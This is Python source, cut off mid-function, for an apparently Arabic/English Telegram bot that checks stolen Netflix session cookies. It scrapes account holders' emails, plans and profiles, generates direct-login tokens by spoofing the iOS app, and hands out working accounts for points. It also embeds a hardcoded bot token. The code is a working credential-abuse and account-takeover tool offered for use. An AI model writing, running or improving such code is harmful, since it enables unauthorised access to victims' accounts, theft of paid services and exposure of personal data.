import os
import re
import json
import time
import random
import requests
import zipfile
import urllib.parse
import codecs
import logging
import tempfile
import shutil
from datetime import datetime
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot import apihelper

apihelper.CONNECT_TIMEOUT = 60
apihelper.READ_TIMEOUT = 60

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

OWNER_CREDIT = "@farxxes"
OWNER_LINK = "https://t.me/farxxes"

BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAFWROowv0uHXfHrvVnqYlMUUM1amTAjedA')
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_IDS = [8713916851]

REQUIRED_CHANNEL = os.environ.get('REQUIRED_CHANNEL', '@faresschannel')
CHANNEL_LINK = os.environ.get('CHANNEL_LINK', 'https://t.me/faresschannel')

DB_FILE = 'database.json'
db_lock = threading.Lock()

user_locks = {}
user_locks_lock = threading.Lock()

def get_user_lock(user_id):
    with user_locks_lock:
        if user_id not in user_locks:
            user_locks[user_id] = threading.Lock()
        return user_locks[user_id]

active_scans = {}
user_languages = {}
user_pull_sessions = {}

REGION_COUNTRIES = {
    'AMERICA': ['US', 'CA', 'MX', 'AR', 'BR', 'CO', 'CL'],
    'EUROPE': ['FR', 'GB', 'DE', 'ES', 'IT', 'NL', 'PL', 'PT', 'RU', 'SE', 'CH', 'BE'],
    'MIDDLE_EAST': ['SA', 'AE', 'QA', 'KW', 'IQ', 'JO', 'LB', 'EG', 'DZ', 'MA', 'TN'],
    'ASIA': ['TR', 'JP', 'KR', 'IN']
}

COUNTRY_DATA = {
    'US': {'ar': '🇺🇸 الولايات المتحدة', 'en': '🇺🇸 United States'},
    'FR': {'ar': '🇫🇷 فرنسا', 'en': '🇫🇷 France'},
    'GB': {'ar': '🇬🇧 بريطانيا', 'en': '🇬🇧 United Kingdom'},
    'CA': {'ar': '🇨🇦 كندا', 'en': '🇨🇦 Canada'},
    'DE': {'ar': '🇩🇪 ألمانيا', 'en': '🇩🇪 Germany'},
    'BR': {'ar': '🇧🇷 البرازيل', 'en': '🇧🇷 Brazil'},
    'ES': {'ar': '🇪🇸 إسبانيا', 'en': '🇪🇸 Spain'},
    'TR': {'ar': '🇹🇷 تركيا', 'en': '🇹🇷 Turkey'},
    'AR': {'ar': '🇦🇷 الأرجنتين', 'en': '🇦🇷 Argentina'},
    'IN': {'ar': '🇮🇳 الهند', 'en': '🇮🇳 India'},
    'EG': {'ar': '🇪🇬 مصر', 'en': '🇪🇬 Egypt'},
    'SA': {'ar': '🇸🇦 السعودية', 'en': '🇸🇦 Saudi Arabia'},
    'AE': {'ar': '🇦🇪 الإمارات', 'en': '🇦🇪 UAE'},
    'MA': {'ar': '🇲🇦 المغرب', 'en': '🇲🇦 Morocco'},
    'DZ': {'ar': '🇩🇿 الجزائر', 'en': '🇩🇿 الجزائر'},
    'TN': {'ar': '🇹🇳 تونس', 'en': '🇹🇳 تونس'},
    'IT': {'ar': '🇮🇹 إيطاليا', 'en': '🇮🇹 Italy'},
    'JP': {'ar': '🇯🇵 اليابان', 'en': '🇯🇵 Japan'},
    'KR': {'ar': '🇰🇷 كوريا الجنوبية', 'en': '🇰🇷 South Korea'},
    'MX': {'ar': '🇲🇽 المكسيك', 'en': '🇲🇽 Mexico'},
    'NL': {'ar': '🇳🇱 هولندا', 'en': '🇳🇱 Netherlands'},
    'PL': {'ar': '🇵🇱 بولندا', 'en': '🇵🇱 Poland'},
    'PT': {'ar': '🇵🇹 البرتغال', 'en': '🇵🇹 Portugal'},
    'RU': {'ar': '🇷🇺 روسيا', 'en': '🇷🇺 Russia'},
    'SE': {'ar': '🇸🇪 السويد', 'en': '🇸🇪 Sweden'},
    'CH': {'ar': '🇨🇭 سويسرا', 'en': '🇨🇭 Switzerland'},
    'BE': {'ar': '🇧🇪 بلجيكا', 'en': '🇧🇪 Belgium'},
    'CO': {'ar': '🇨🇴 كولومبيا', 'en': '🇨🇴 Colombia'},
    'CL': {'ar': '🇨🇱 تشيلي', 'en': '🇨🇱 Chile'},
    'QA': {'ar': '🇶🇦 قطر', 'en': '🇶🇦 قطر'},
    'KW': {'ar': '🇰🇼 الكويت', 'en': '🇰🇼 الكويت'},
    'IQ': {'ar': '🇮🇶 العراق', 'en': '🇮🇶 العراق'},
    'JO': {'ar': '🇯🇴 الأردن', 'en': '🇯🇴 الأردن'},
    'LB': {'ar': '🇱🇧 لبنان', 'en': '🇱🇧 لبنان'}
}

def get_country_name(code, lang='ar'):
    if not code or code == "Unknown":
        return "🌍 غير معروف" if lang == 'ar' else "🌍 Unknown"
    code = code.upper()
    if code in COUNTRY_DATA:
        return COUNTRY_DATA[code][lang]
    return f"🌍 {code}"

def load_db():
    if not os.path.exists(DB_FILE):
        return {"users": {}, "accounts": [], "stats": {"checked": 0, "valid": 0}, "redeem_codes": {}, "user_last_pull": {}}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if "users" not in data or isinstance(data["users"], list):
                old_users = data.get("users", [])
                data["users"] = {str(uid): {"points": 3, "banned": False} for uid in old_users}
            if "redeem_codes" not in data:
                data["redeem_codes"] = {}
            if "user_last_pull" not in data:
                data["user_last_pull"] = {}
            for uid, udata in data["users"].items():
                if "points" not in udata:
                    udata["points"] = 3
                if "pulled_count" not in udata:
                    udata["pulled_count"] = 0
                if "checked_count" not in udata:
                    udata["checked_count"] = 0
                if "join_date" not in udata:
                    udata["join_date"] = datetime.now().strftime("%d/%m/%Y")
                if "referred_by" not in udata:
                    udata["referred_by"] = None
            return data
    except:
        return {"users": {}, "accounts": [], "stats": {"checked": 0, "valid": 0}, "redeem_codes": {}, "user_last_pull": {}}

def save_db(data):
    with db_lock:
        with open(DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

def get_user_data(user_id):
    db = load_db()
    str_id = str(user_id)
    if str_id not in db["users"]:
        db["users"][str_id] = {
            "points": 3,
            "banned": False,
            "pulled_count": 0,
            "checked_count": 0,
            "join_date": datetime.now().strftime("%d/%m/%Y"),
            "referred_by": None
        }
        save_db(db)
    return db["users"][str_id]

def update_user_points(user_id, amount):
    db = load_db()
    str_id = str(user_id)
    if str_id not in db["users"]:
        db["users"][str_id] = {
            "points": 3 + amount,
            "banned": False,
            "pulled_count": 0,
            "checked_count": 0,
            "join_date": datetime.now().strftime("%d/%m/%Y"),
            "referred_by": None
        }
    else:
        db["users"][str_id]["points"] += amount
        if db["users"][str_id]["points"] < 0:
            db["users"][str_id]["points"] = 0
    save_db(db)

def increment_user_stats(user_id, pulled=0, checked=0):
    db = load_db()
    str_id = str(user_id)
    if str_id not in db["users"]:
        get_user_data(user_id)
        db = load_db()
    db["users"][str_id]["pulled_count"] = db["users"][str_id].get("pulled_count", 0) + pulled
    db["users"][str_id]["checked_count"] = db["users"][str_id].get("checked_count", 0) + checked
    save_db(db)

def add_account_to_db(account_info):
    if account_info.get('on_payment_hold') == 'Yes':
        return False
    db = load_db()
    netflix_id = account_info['cookie'].get('NetflixId')
    exists = any(acc['cookie'].get('NetflixId') == netflix_id or (acc.get('email') != 'Unknown' and acc.get('email') == account_info.get('email')) for acc in db['accounts'])
    if not exists:
        db['accounts'].append(account_info)
        db['stats']['valid'] = len(db['accounts'])
        save_db(db)
        return True
    return False

def check_subscription(user_id):
    if not REQUIRED_CHANNEL:
        return True
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        if member.status in ['member', 'creator', 'administrator']:
            return True
    except Exception as e:
        logger.error(f"Error checking subscription: {e}")
    return False

def send_sub_required_message(target_obj, lang='ar'):
    markup = InlineKeyboardMarkup(row_width=1)
    chat_id = target_obj.chat.id if hasattr(target_obj, 'chat') else target_obj
    if lang == 'en':
        markup.add(InlineKeyboardButton("📢 Subscribe to Channel", url=CHANNEL_LINK))
        markup.add(InlineKeyboardButton("🔄 Verify Subscription", callback_data="check_sub"))
        text = "⚠️ **Sorry, you must subscribe to the bot's channel first to use it!**\n\nAfter subscribing, click the verify button below."
    else:
        markup.add(InlineKeyboardButton("📢 اشترك في القناة هنا", url=CHANNEL_LINK))
        markup.add(InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub"))
        text = "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!**\n\nبعد الاشتراك، اضغط على زر التحقق أدناه."
    
    try:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode='Markdown')
    except:
        pass

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def format_billing_date(raw):
    try:
        raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
        clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
        dt = datetime.strptime(clean, '%Y-%m-%dT%H:%M:%S')
        return dt.strftime('%d/%m/%Y')
    except Exception:
        try:
            date_part = raw.split('T')[0]
            y, m, d = date_part.split('-')
            return f"{d}/{m}/{y}"
        except Exception:
            return raw

def extract_netflix_id(content):
    token_match = re.search(r'nftoken=([^\s&]+)', content)
    if token_match:
        return {"type": "token", "value": token_match.group(1)}

    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return {"type": "cookie", "value": cookie.get("value")}
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return {"type": "cookie", "value": data["NetflixId"]}
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return {"type": "cookie", "value": cookie.get("value")}
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return {"type": "cookie", "value": netflix_id}
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return {"type": "cookie", "value": netflix_id}
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return {"type": "cookie", "value": netflix_id}
    
    return None

def extract_next_billing_date(response_text):
    try:
        billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
        if billing_match:
            billing_data = billing_match.group(0)
            date_match = re.search(r'"date":\s*"([^"]+)"', billing_data)
            if date_match:
                return date_match.group(1)
        
        date_match = re.search(r'"nextBillingDate"[^}]+"date":\s*"([^"]+)"', response_text)
        if date_match:
            return date_match.group(1)
    except Exception as e:
        logger.error(f"Error extracting billing date: {e}")
    return "Unknown"

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    
    endpoints = [
        'https://www.netflix.com/YourAccount',
        'https://www.netflix.com/youraccount'
    ]
    url = random.choice(endpoints)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        resp = session.get(url, headers=headers, timeout=20)
        txt = resp.text
        
        if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
            return {'ok': False, 'err': 'Invalid cookie (login page detected)', 'cookie': cookie_dict}
        
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False, 'err': 'Invalid cookie (not logged in)', 'cookie': cookie_dict}

        def find(pattern, text=txt):
            m = re.search(pattern, text)
            return m.group(1).strip() if m else None

        plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        plan = unescape_plan(plan) if plan else "Unknown"

        plan_price = find(r'"planPrice"[^}]+"value":"([^"]+)"') or find(r'planPrice[^}]+value[^}]+"([^"]+)"')
        plan_price = unescape_plan(plan_price) if plan_price else "Unknown"

        member_since = find(r'"memberSince":"([^"]+)"')
        member_since_formatted = format_billing_date(unescape_plan(member_since)) if member_since else "Unknown"

        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or "Unknown"
        max_streams = find(r'"maxStreams"[^}]+"value":(\d+)') or "Unknown"

        # تصحيح دقة الفحص وضبطها بشكل دقيق جداً
        q_lower = video_quality.lower()
        streams_str = str(max_streams)
        if 'ultra' in q_lower or '4k' in q_lower or streams_str == '4':
            video_quality = 'Ultra HD (4K)'
        elif 'hd' in q_lower or streams_str == '2':
            video_quality = 'Full HD'
        elif '720' in q_lower or streams_str == '1' or 'standard' in q_lower:
            video_quality = '720p'

        payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
        payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"

        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        if email != "Unknown":
            email = urllib.parse.unquote(email)
        
        next_billing = format_billing_date(extract_next_billing_date(txt))

        profiles = []
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
            for profile in profile_matches:
                if profile and profile not in profiles:
                    profiles.append(profile)
        except Exception as e:
            logger.error(f"Error extracting profiles: {e}")
        
        profiles_str = ", ".join(profiles) if profiles else "Unknown"

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status_match)
        
        if not is_valid and "NetflixId" in cookie_dict:
            is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
            is_premium = is_valid

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'member_since': member_since_formatted,
            'member_since_raw': member_since,
            'video_quality': video_quality,
            'max_streams': max_streams,
            'on_payment_hold': payment_hold,
            'email': email,
            'profiles': profiles_str,
            'next_billing': next_billing,
            'cookie': cookie_dict
        }
    except Exception as e:
        logger.error(f"Error checking Netflix cookie: {str(e)}")
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=20, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
                
            generation_time = int(time.time())
            time_remaining = expires - generation_time
            
            return {
                "status": "Success",
                "generation_time": generation_time,
                "expires": expires,
                "time_remaining": time_remaining,
                "token": token,
                "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"
            }
        else:
            return {"status": "Failure", "error": "No token found in response"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP file: {e}")
        return []

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.from_user.id
    
    args = message.text.split()
    if len(args) > 1:
        ref_arg = args[1]
        if ref_arg.isdigit():
            referrer_id = int(ref_arg)
            if referrer_id != user_id:
                user_data = get_user_data(user_id)
                if user_data.get("referred_by") is None:
                    db = load_db()
                    db["users"][str(user_id)]["referred_by"] = referrer_id
                    save_db(db)
                    update_user_points(referrer_id, 2)
                    try:
                        bot.send_message(referrer_id, f"🎁 **مبروك!** قام شخص بالدخول عبر رابط الدعوة الخاص بك وحصلت على `2` نقاط إضافية.")
                    except:
                        pass

    user_data = get_user_data(user_id)
    if user_data.get("banned", False):
        bot.reply_to(message, "❌ You are banned from using this bot." if user_languages.get(user_id) == 'en' else "❌ أنت محظور من استخدام هذا البوت.")
        return

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar"),
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    bot.reply_to(message, "🌐 **Please choose your language / يرجى اختيار لغتك:**", reply_markup=markup, parse_mode='Markdown')

def show_main_menu(chat_id, user_id):
    if not check_subscription(user_id):
        lang = user_languages.get(user_id, 'ar')
        class FakeMsg:
            def __init__(self, cid):
                self.chat = type('obj', (object,), {'id': cid})
        send_sub_required_message(FakeMsg(chat_id), lang)
        return

    user_data = get_user_data(user_id)
    if user_data.get("banned", False):
        return

    lang = user_languages.get(user_id, 'ar')
    points = user_data["points"]
    
    markup = InlineKeyboardMarkup(row_width=1)
    
    if lang == 'en':
        welcome_text = (
            f"🎬 **Welcome to the Advanced Netflix Cookie Checker Bot!**\n\n"
            f"💰 Your Points: `{points}` 🪙\n"
            "🔹 Send cookie text or token link, or upload a `.txt` / `.zip` file.\n"
            "🔹 Checking is FREE! Pulling accounts uses dynamic point pricing.\n"
            f"👨‍💻 **Developer:** [{OWNER_CREDIT}]({OWNER_LINK})\n\n"
            "👇 **Choose an option below:**"
        )
        markup.add(
            InlineKeyboardButton("🎟️ Pull Account (Smart Filter)", callback_data="btn_pull_region"),
            InlineKeyboardButton("👤 My Profile", callback_data="btn_profile"),
            InlineKeyboardButton("🔄 Request Replacement", callback_data="btn_replace"),
            InlineKeyboardButton("💳 Recharge Points & Invite", callback_data="btn_recharge"),
            InlineKeyboardButton("📢 Bot Channel", url=CHANNEL_LINK)
        )
        if user_id in ADMIN_IDS:
            markup.add(InlineKeyboardButton("📊 Admin Panel", callback_data="btn_admin"))
    else:
        welcome_text = (
            f"🎬 **أهلاً بك في بوت فحص كوكيز Netflix الشامل والمطور!**\n\n"
            f"💰 رصيدك الحالي: `{points}` نقطة 🪙\n"
            "🔹 فحص الملفات والكوكيز (مجاني وسريع جداً!).\n"
            "🔹 سحب حساب ذكي حسب المنطقة والدقة.\n"
            f"👨‍💻 **المطور:** [{OWNER_CREDIT}]({OWNER_LINK})\n\n"
            "👇 **اختر ما تحتاجه من الأزرار أدناه:**"
        )
        markup.add(
            InlineKeyboardButton("🎟️ سحب حساب (تصفية ذكية ومتطورة)", callback_data="btn_pull_region"),
            InlineKeyboardButton("👤 حسابي وإحصائياتي", callback_data="btn_profile"),
            InlineKeyboardButton("🔄 طلب تعويض (إذا لم يعمل)", callback_data="btn_replace"),
            InlineKeyboardButton("💳 شحن النقاط ودعوة الأصدقاء", callback_data="btn_recharge"),
            InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
        )
        if user_id in ADMIN_IDS:
            markup.add(InlineKeyboardButton("📊 لوحة الأدمن", callback_data="btn_admin"))

    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode='Markdown', disable_web_page_preview=True)

def send_user_profile(chat_id, user_id):
    lang = user_languages.get(user_id, 'ar')
    user_data = get_user_data(user_id)
    
    points = user_data.get("points", 0)
    pulled_count = user_data.get("pulled_count", 0)
    checked_count = user_data.get("checked_count", 0)
    join_date = user_data.get("join_date", "Unknown")

    if lang == 'en':
        profile_text = (
            f"👤 **Your User Profile & Stats:**\n\n"
            f"🆔 Telegram ID: `{user_id}`\n"
            f"💰 Current Points: `{points}` 🪙\n"
            f"🎟️ Accounts Pulled: `{pulled_count}`\n"
            f"🔍 Files & Cookies Checked: `{checked_count}`\n"
            f"📅 Join Date: `{join_date}`\n\n"
            f"👨‍💻 **Developer:** [{OWNER_CREDIT}]({OWNER_LINK})"
        )
    else:
        profile_text = (
            f"👤 **ملفك الشخصي وإحصائياتك في البوت:**\n\n"
            f"🆔 معرف الحساب (ID): `{user_id}`\n"
            f"💰 رصيدك الحالي: `{points}` نقطة 🪙\n"
            f"🎟️ عدد الحسابات المسحوبة: `{pulled_count}`\n"
            f"🔍 عدد الملفات والكوكيز المفحوصة: `{checked_count}`\n"
            f"📅 تاريخ انضمامك للبوت: `{join_date}`\n\n"
            f"👨‍💻 **المطور:** [{OWNER_CREDIT}]({OWNER_LINK})"
        )
    bot.send_message(chat_id, profile_text, parse_mode='Markdown', disable_web_page_preview=True)

@bot.message_handler(commands=['profile', 'account'])
def cmd_profile(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        send_sub_required_message(message, user_languages.get(user_id, 'ar'))
        return
    send_user_profile(message.chat.id, user_id)

@bot.message_handler(commands=['id'])
def cmd_id(message):
    user_id = message.from_user.id
    lang = user_languages.get(user_id, 'ar')
    if not check_subscription(user_id):
        send_sub_required_message(message, lang)
        return
    if lang == 'en':
        bot.reply_to(message, f"🆔 **Your Telegram ID:** `{user_id}`\nSend this ID to the developer [{OWNER_CREDIT}]({OWNER_LINK}) to recharge points.", parse_mode='Markdown', disable_web_page_preview=True)
    else:
        bot.reply_to(message, f"🆔 **معرف الحساب (ID) الخاص بك:** `{user_id}`\nأرسل هذا المعرف للمطور [{OWNER_CREDIT}]({OWNER_LINK}) لإضافة النقاط.", parse_mode='Markdown', disable_web_page_preview=True)

@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    
    text_to_broadcast = message.text.replace('/broadcast', '').strip()
    if not text_to_broadcast:
        bot.reply_to(message, "❌ Please write the message after the command.\nExample: `/broadcast Hello users!`", parse_mode='Markdown')
        return

    db = load_db()
    users = db.get("users", {})
    success_count = 0
    fail_count = 0

    msg_wait = bot.reply_to(message, "📢 Broadcasting message to all users...")

    for uid in users.keys():
        try:
            bot.send_message(int(uid), text_to_broadcast, parse_mode='Markdown', disable_web_page_preview=True)
            success_count += 1
            time.sleep(0.05)
        except:
            fail_count += 1

    bot.edit_message_text(f"✅ **Broadcast Completed!**\n📤 Successfully sent: `{success_count}`\n❌ Failed: `{fail_count}`", message.chat.id, msg_wait.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['stats', 'admin'])
def admin_panel_command(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return

    db = load_db()
    total_users = len(db.get("users", {}))
    total_valid = len(db.get("accounts", []))
    total_checked = db.get("stats", {}).get("checked", 0)

    stats_msg = (
        "📊 **Admin Control Panel:**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"🔍 Total Checked: `{total_checked}`\n"
        f"💾 Working Accounts in Memory: `{total_valid}`\n"
        f"👨‍💻 Developer: [{OWNER_CREDIT}]({OWNER_LINK})\n"
    )
    bot.reply_to(message, stats_msg, parse_mode='Markdown', disable_web_page_preview=True)

@bot.message_handler(commands=['cleanmem'])
def cmd_cleanmem(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return
    
    msg_wait = bot.reply_to(message, "🧹 Cleaning memory...")
    db = load_db()
    accounts = db.get("accounts", [])
    valid_accounts = []
    removed_count = 0

    for acc in accounts:
        netflix_id = acc['cookie'].get('NetflixId')
        check = check_netflix_cookie({"NetflixId": netflix_id})
        if check["ok"] and check.get('plan') != "Unknown" and check.get('on_payment_hold') != 'Yes':
            token_res = generate_token(netflix_id)
            if token_res.get('status') == 'Success':
                valid_accounts.append(acc)
            else:
                removed_count += 1
        else:
            removed_count += 1

    db["accounts"] = valid_accounts
    db["stats"]["valid"] = len(valid_accounts)
    save_db(db)

    bot.edit_message_text(f"✅ Cleaned! Removed: `{removed_count}` | Active: `{len(valid_accounts)}`", message.chat.id, msg_wait.message_id, parse_mode='Markdown')

def background_auto_cleaner():
    while True:
        time.sleep(3600)
        try:
            db = load_db()
            accounts = db.get("accounts", [])
            if not accounts:
                continue
            
            valid_accounts = []
            for acc in accounts:
                netflix_id = acc['cookie'].get('NetflixId')
                check = check_netflix_cookie({"NetflixId": netflix_id})
                if check["ok"] and check.get('plan') != "Unknown" and check.get('on_payment_hold') != 'Yes':
                    token_res = generate_token(netflix_id)
                    if token_res.get('status') == 'Success':
                        valid_accounts.append(acc)
                time.sleep(0.5)
            
            db["accounts"] = valid_accounts
            db["stats"]["valid"] = len(valid_accounts)
            save_db(db)
        except Exception as e:
            logger.error(f"Error in background_auto_cleaner: {e}")

threading.Thread(target=background_auto_cleaner, daemon=True).start()

@bot.message_handler(commands=['addpoints'])
def cmd_addpoints(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        amount = int(parts[2])
        update_user_points(target_id, amount)
        bot.reply_to(message, f"✅ Successfully added {amount} points to user {target_id}.")
    except:
        bot.reply_to(message, "❌ Usage: `/addpoints [user_id] [amount]`", parse_mode='Markdown')

@bot.message_handler(commands=['genkey'])
def cmd_genkey(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = message.text.split()
        amount = int(parts[1])
        key = f"NETFLIX-{uuid.uuid4().hex[:8].upper()}"
        db = load_db()
        db["redeem_codes"][key] = amount
        save_db(db)
        bot.reply_to(message, f"✅ Redeem code created:\n`{key}`\nPoints: {amount}", parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ Usage: `/genkey [points]`", parse_mode='Markdown')

@bot.message_handler(commands=['ban'])
def cmd_ban(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        target_id = message.text.split()[1]
        db = load_db()
        if target_id in db["users"]:
            db["users"][target_id]["banned"] = True
            save_db(db)
            bot.reply_to(message, f"✅ User {target_id} has been banned.")
    except:
        bot.reply_to(message, "❌ Usage: `/ban [user_id]`")

def count_filtered_accounts(region, quality):
    db = load_db()
    accounts = db.get("accounts", [])
    count = 0
    for acc in accounts:
        acc_country = str(acc.get('country', '')).strip().upper()
        if region != "ALL":
            allowed_countries = REGION_COUNTRIES.get(region, [])
            if acc_country not in allowed_countries:
                continue

        q_text = str(acc.get('video_quality', '')).upper()
        if quality == 'UHD':
            if 'ULTRA' not in q_text and '4K' not in q_text:
                continue
        elif quality == 'HD':
